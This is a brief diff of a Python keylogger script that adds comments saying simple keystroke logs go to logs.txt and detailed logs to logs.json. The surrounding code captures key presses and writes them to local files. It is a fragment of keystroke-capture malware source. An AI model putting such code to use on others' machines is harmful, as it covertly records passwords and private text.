@@ -17,14 +17,14 @@ def update_txt_file(key):
     letter=letter.replace("Key.shift","")
     letter=letter.replace("Key.backspace","<backspace>")
     with open('logs.txt' , '+w') as key_strokes:
-        key_strokes.write(letter)
+        key_strokes.write(letter)                #simple logs are stored in logs.txt
  
 
 def update_json_file (key_list):
 
     with open('logs.json' , '+wb') as key_log:
         key_list_bytes = json.dumps(key_list).encode()
-        key_log.write(key_list_bytes)
+        key_log.write(key_list_bytes)            #detailed logs are stored in logs.json
  
 
 def on_press(key) :
